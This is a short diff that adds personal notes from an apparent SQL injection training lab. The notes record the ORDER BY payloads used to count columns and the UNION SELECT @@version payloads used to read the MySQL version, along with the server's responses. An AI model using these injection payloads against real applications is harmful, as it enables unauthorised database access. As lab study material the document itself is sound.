@@ -1,0 +1,26 @@
+LAB DESCRIPTION
+1. SQLi vuln in product category
+2. given db: microsoft or mySQL
+GOAL
+1. To display database version
+
+PREREQUISITE
+1. Querying database type and version
+    a) Microsoft, MySQL :	SELECT @@version
+2. comment for mySQL is # or %23 
+
+ANALYSIS
+1. get no of col
+    this is accepting url encoding 
+    a) '+order+by+1%23 
+        <ok>
+    b) '+order+by+2%23
+        <ok>
+    c) '+order+by+3%23
+        <internal server error>
+    no of col = 2
+2. retrieve version string
+    a) +UNION+SELECT+NULL,NULL%23
+        <ok>
+    c) +UNION+SELECT+NULL,@@version%23
+        8.0.27
